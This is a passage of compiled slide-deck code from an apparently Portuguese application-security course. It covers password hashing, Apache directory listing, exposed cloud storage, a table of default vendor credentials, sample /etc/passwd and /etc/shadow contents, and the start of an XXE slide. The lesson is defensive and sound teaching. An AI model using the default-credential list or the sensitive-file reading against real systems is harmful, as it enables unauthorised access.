salt",-1),O2=n("br",null,null,-1),I2=n("span",{style:{"font-size":"14px"}},"38d72b8e1c8fb24e1adc392f842f2051",-1),T2=n("table",null,[n("thead",null,[n("tr",null,[n("th",null,"Id"),n("th",null,"Senha"),n("th",null,"Hash")])]),n("tbody",null,[n("tr",null,[n("td",null,"1"),n("td",null,"123456"),n("td",null,"e10adc3949ba59abbe56e057f20f883e")]),n("tr",null,[n("td",null,"2"),n("td",null,"12345"),n("td",null,"827ccb0eea8a706c4c34a16891f84e7b")]),n("tr",null,[n("td",null,"3"),n("td",null,"123456789"),n("td",null,"25f9e794323b453885f5181f1b624d0b")]),n("tr",null,[n("td",null,"4"),n("td",null,"password"),n("td",null,"5f4dcc3b5aa765d61d8327deb882cf99")]),n("tr",null,[n("td",null,"5"),n("td",null,"iloveyou"),n("td",null,"f25a2fc72690b780b2a14e140ef6a9e0")]),n("tr",null,[n("td",null,"6"),n("td",null,"princess"),n("td",null,"8afa847f50a716e64932d995c8e7435a")]),n("tr",null,[n("td",null,"7"),n("td",null,"1234567"),n("td",null,"fcea920f7412b5da7be0cf42b8c93759")]),n("tr",null,[n("td",null,"8"),n("td",null,"12345678"),n("td",null,"25d55ad283aa400af464c76d713c07ad")]),n("tr",null,[n("td",null,"9"),n("td",null,"abc123"),n("td",null,"e99a18c428cb38d5f260853678922e03")]),n("tr",null,[n("td",null,"10"),n("td",null,"nicole"),n("td",null,"fc63f87c08d505264caba37514cd0cfd")]),n("tr",null,[n("td",null,"11"),n("td",null,"daniel"),n("td",null,"aa47f8215c6f30a0dcdb2a36a9f4168e")]),n("tr",null,[n("td",null,"12"),n("td",null,"babygirl"),n("td",null,"67881381dbc68d4761230131ae0008f7")])])],-1),P2=[T2],M2={__name:"23",setup(e){const t={srcSequence:"./slides/34.hash.md"};return N(U),(s,o)=>{const r=Ne,l=hs,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[C2,$2,n("div",D2,[W((_(),$("div",B2,[C(r,{src:"hacker.png",style:{width:"100px",margin:"0 auto","margin-top":"80px"}}),F2,O2,I2])),[[i]]),W((_(),$("div",null,P2)),[[i,2]])]),W(C(l,{x1:"330",y1:"270",x2:"490",y2:"270",color:"#ccc",width:"2",arrowSize:"1"},null,512),[[i,2]])]),_:1},16)}}},L2=n("h1",null,"Dicas",-1),R2=n("p",null,"Utilizar algoritmos de hash conhecidos por serem seguros.",-1),N2=n("ul",null,[n("li",null,"Bcrypt"),n("li",null,"Scrypt"),n("li",null,"Argon2")],-1),q2={__name:"24",setup(e){const t={srcSequence:"./slides/35.hash.md"};return N(U),(s,o)=>(_(),Y(Ce,pe(de(t)),{default:X(()=>[L2,R2,N2]),_:1},16))}},j2=n("h1",null,"Pr\xE1tica com Bcrypt",-1),H2={__name:"25",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/36.hash.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[j2]),_:1},16))}},z2=n("h1",null,"Configura\xE7\xE3o padr\xE3o ou insegura",-1),V2={__name:"26",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/40.security-misconfiguration.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[z2]),_:1},16))}},U2=n("h1",null,"Listagem de diret\xF3rios",-1),W2={grid:"~ cols-2"},Y2=n("br",null,null,-1),K2=n("h6",null,"Padr\xE3o do Apache2:",-1),X2=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"Directory"),n("span",{style:{color:"#DBD7CA"}}," /var/www"),n("span",{style:{color:"#858585"}},"/>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"        Options Indexes FollowSymLinks")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"        AllowOverride None")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"        Require all granted")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"Directory"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"Directory"),n("span",{style:{color:"#393A34"}}," /var/www"),n("span",{style:{color:"#8E8F8B"}},"/>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"        Options Indexes FollowSymLinks")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"        AllowOverride None")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"        Require all granted")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"Directory"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),Q2=n("br",null,null,-1),Z2=n("h6",null,"Recomenda\xE7\xE3o:",-1),G2=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"Directory"),n("span",{style:{color:"#DBD7CA"}}," /var/www"),n("span",{style:{color:"#858585"}},"/>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"        Options -Indexes -FollowSymLinks")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"        AllowOverride None")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"        Require all granted")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"Directory"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"Directory"),n("span",{style:{color:"#393A34"}}," /var/www"),n("span",{style:{color:"#8E8F8B"}},"/>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"        Options -Indexes -FollowSymLinks")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"        AllowOverride None")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"        Require all granted")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"Directory"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),J2={__name:"27",setup(e){const t={srcSequence:"./slides/41.security-misconfiguration.md"};return N(U),(s,o)=>{const r=Ne,l=gs,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[U2,n("div",W2,[n("div",null,[n("div",null,[W(C(r,{src:"google-hacking.png",style:{"border-radius":"10px",transition:"500ms"},width:"350"},null,512),[[i]])]),Y2,n("div",null,[W(C(r,{src:"directory-list.png",style:{"border-radius":"10px"},width:"350"},null,512),[[i]])])]),W((_(),$("div",null,[K2,C(l,Qe({},{ranges:[""]}),{default:X(()=>[X2]),_:1},16),Q2,Z2,C(l,Qe({},{ranges:["2"]}),{default:X(()=>[G2]),_:1},16)])),[[i]])])]),_:1},16)}}},ex=n("h1",null,"Storage de Armazenamentos",-1),tx=n("ul",null,[n("li",null,"Simple Storage Service (S3) - Amazon"),n("li",null,"Firebase Storage - Google")],-1),nx={__name:"28",setup(e){const t={srcSequence:"./slides/42.security-misconfiguration.md"};return N(U),(s,o)=>(_(),Y(Ce,pe(de(t)),{default:X(()=>[ex,tx]),_:1},16))}};const sx=n("h1",null,"Usu\xE1rio e senha padr\xE3o",-1),ox={grid:"~ cols-2"},rx={class:"pass-default-table",style:{transition:"500ms"}},lx=n("table",null,[n("thead",null,[n("tr",null,[n("th",null,[n("strong",null,"App")]),n("th",null,[n("strong",null,"Usu\xE1rio")]),n("th",null,[n("strong",null,"Senha")])])]),n("tbody",null,[n("tr",null,[n("td",null,"Apache Tomcat"),n("td",null,"admin"),n("td",null,"admin")]),n("tr",null,[n("td",null,"Apache Tomcat"),n("td",null,"admin"),n("td",null,"j5Brn9")]),n("tr",null,[n("td",null,"Gitlab"),n("td",null,"admin"),n("td",null,"5iveL")]),n("tr",null,[n("td",null,"Gitlab"),n("td",null,"admin"),n("td",null,"5iveL!fe")]),n("tr",null,[n("td",null,"Gitlab"),n("td",null,"root"),n("td",null,"5iveL!fe")]),n("tr",null,[n("td",null,"MSSQL"),n("td",null,"sa"),n("td",null,"BLANK")]),n("tr",null,[n("td",null,"MSSQL"),n("td",null,"sa"),n("td",null,"sa")]),n("tr",null,[n("td",null,"MSSQL"),n("td",null,"sa"),n("td",null,"password")]),n("tr",null,[n("td",null,"MSSQL"),n("td",null,"sa"),n("td",null,"Password123")]),n("tr",null,[n("td",null,"MySQL"),n("td",null,"root"),n("td",null,"BLANK")]),n("tr",null,[n("td",null,"MySQL"),n("td",null,"superdba"),n("td",null,"admin")]),n("tr",null,[n("td",null,"SonarQube"),n("td",null,"admin"),n("td",null,"admin")]),n("tr",null,[n("td",null,"SonicWALL"),n("td",null,"admin"),n("td",null,"password")])])],-1),ix=[lx],ax=n("br",null,null,-1),cx=n("h6",null,"Fonte das credenciais:",-1),ux=n("h6",null,[n("a",{href:"https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv",target:"_blank",rel:"noopener"},"https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv")],-1),dx=[cx,ux],px={__name:"29",setup(e){const t={srcSequence:"./slides/43.security-misconfiguration.md"};return N(U),(s,o)=>{const r=Ne,l=hs,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[sx,n("div",ox,[n("div",null,[W(C(r,{src:"shodan.png",style:{"border-radius":"10px",transition:"500ms"},width:"400"},null,512),[[i]])]),W((_(),$("div",rx,ix)),[[i]])]),W(C(l,{x1:"950",y1:"360",x2:"830",y2:"395",color:"#F00",width:"3",arrowSize:"1",style:{transition:"500ms"}},null,512),[[i]]),ax,W((_(),$("div",null,dx)),[[i]])]),_:1},16)}}},fx=n("h1",null,"Aplica\xE7\xE3o com privil\xE9gios de administrador (root)",-1),mx=n("p",null,"Uma aplica\xE7\xE3o sendo executada com permiss\xF5es de root poder\xE1 efetuar qualquer opera\xE7\xE3o.",-1),hx={grid:"~ cols-2 gap-4"},gx={style:{transition:"500ms"}},yx=n("p",null,"E se a aplica\xE7\xE3o estiver vulner\xE1vel a leitura arbitr\xE1ria de arquivos ?",-1),vx=n("br",null,null,-1),_x={style:{transition:"500ms"}},bx=n("h5",null,"Arquivo de contas: /etc/passwd",-1),xx=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"root:x:0:0:root:/root:/bin/bash")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"sys:x:3:3:sys:/dev:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"sync:x:4:65534:sync:/bin:/bin/sync")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"games:x:5:60:games:/usr/games:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"mail:x:8:8:mail:/var/mail:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"proxy:x:13:13:proxy:/bin:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"appsec:x:1000:1000::/home/appsec:/bin/bash")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"root:x:0:0:root:/root:/bin/bash")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"sys:x:3:3:sys:/dev:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"sync:x:4:65534:sync:/bin:/bin/sync")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"games:x:5:60:games:/usr/games:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"mail:x:8:8:mail:/var/mail:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"proxy:x:13:13:proxy:/bin:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"appsec:x:1000:1000::/home/appsec:/bin/bash")])])])],-1),wx=n("h5",null,"Arquivo de senhas: /etc/shadow (Restrito \xE0 root)",-1),Ex=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"root:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"sys:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"sync:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"games:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"mail:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"proxy:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"www-data:"),n("span",{style:{color:"#CB7676"}},"*"),n("span",{style:{color:"#DBD7CA"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"appsec:"),n("span",{style:{color:"#858585"}},"$"),n("span",{style:{color:"#B8A965"}},"1"),n("span",{style:{color:"#858585"}},"$"),n("span",{style:{color:"#B8A965"}},"w29RF9x7"),n("span",{style:{color:"#DBD7CA"}},"$/T2ge9uNKATepqNvd/dod.:19284:0:99999:7:::")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"root:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"sys:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"sync:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"games:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"mail:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"proxy:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"www-data:"),n("span",{style:{color:"#AB5959"}},"*"),n("span",{style:{color:"#393A34"}},":19143:0:99999:7:::")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"appsec:"),n("span",{style:{color:"#8E8F8B"}},"$"),n("span",{style:{color:"#8C862B"}},"1"),n("span",{style:{color:"#8E8F8B"}},"$"),n("span",{style:{color:"#8C862B"}},"w29RF9x7"),n("span",{style:{color:"#393A34"}},"$/T2ge9uNKATepqNvd/dod.:19284:0:99999:7:::")])])])],-1),Ax={__name:"30",setup(e){const t={srcSequence:"./slides/44.security-misconfiguration.md"};return N(U),(s,o)=>{const r=Ne,l=gs,i=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[fx,mx,n("div",hx,[W((_(),$("div",gx,[yx,vx,n("div",null,[C(r,{src:"confidencial-folder.png",style:{"border-radius":"10px",margin:"0 auto"},width:"200"})])])),[[i]]),W((_(),$("div",_x,[bx,C(l,Qe({},{ranges:[""]}),{default:X(()=>[xx]),_:1},16),wx,C(l,Qe({},{ranges:[""]}),{default:X(()=>[Ex]),_:1},16)])),[[i]])])]),_:1},16)}}},Sx=n("h1",null,"XML External Entities (XXE)",-1),kx={grid:"~ cols-2 gap-4"},Cx={style:{transition:"500ms"}},$x=n("p",null,"XML Padr\xE3o",-1),Dx=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<?"),n("span",{style:{color:"#429988"}},"xml"),n("span",{style:{color:"#E0A569"}}," version"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"1.0"'),n("span",{style:{color:"#E0A569"}}," encoding"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"UTF-8"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produtos"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Televis\xE3o"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"850.50"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Eletr\xF4nicos"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Celular"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"752"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Eletr\xF4nicos"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produtos"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<?"),n("span",{style:{color:"#2F8A89"}},"xml"),n("span",{style:{color:"#B58451"}}," version"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"1.0"'),n("span",{style:{color:"#B58451"}}," encoding"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"UTF-8"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produtos"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Televis\xE3o"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"850.50"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Eletr\xF4nicos"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Celular"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"752"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Eletr\xF4nicos"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produtos"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),Bx={style:{transition:"500ms"}},Fx=n("p",null,"XML com vari\xE1veis",-1),Ox=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<?"),n("span",{style:{color:"#429988"}},"xml"),n("span",{style:{color:"#E0A569"}}," version"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"1.0"'),n("span",{style:{color:"#E0A569"}}," encoding"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"UTF-8"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"DOCTYPE"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"produtos"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"[")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"ENTITY"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#C98A7D"}},'"Eletr\xF4nicos"'),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produtos"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Televis\xE3o"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"850.50"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
